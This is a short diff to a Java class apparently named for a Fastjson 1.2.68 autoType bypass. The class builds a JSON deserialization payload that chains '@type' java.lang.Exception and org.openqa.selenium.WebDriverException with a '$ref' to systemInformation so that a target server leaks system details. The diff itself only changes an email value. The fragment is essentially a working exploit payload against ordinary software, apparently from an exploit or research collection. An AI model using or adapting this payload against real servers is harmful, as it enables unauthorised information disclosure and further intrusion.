@@ -13,7 +13,7 @@ public class seleniumBypassAutotype1_2_68 {
         String payload = "\n"
             + "{\n"
             + "    \"name\":\"tony\",\n"
-            + "    \"email\":\"tony@qq.com\",\n"
+            + "    \"email\":\"t11@qq.com\",\n"
             + "    \"content\":{\"$ref\":\"$x.systemInformation\"},\n"
             + "    \"x\":{\n"
             + "                \"@type\":\"java.lang.Exception\",\"@type\":\"org.openqa.selenium.WebDriverException\"\n"
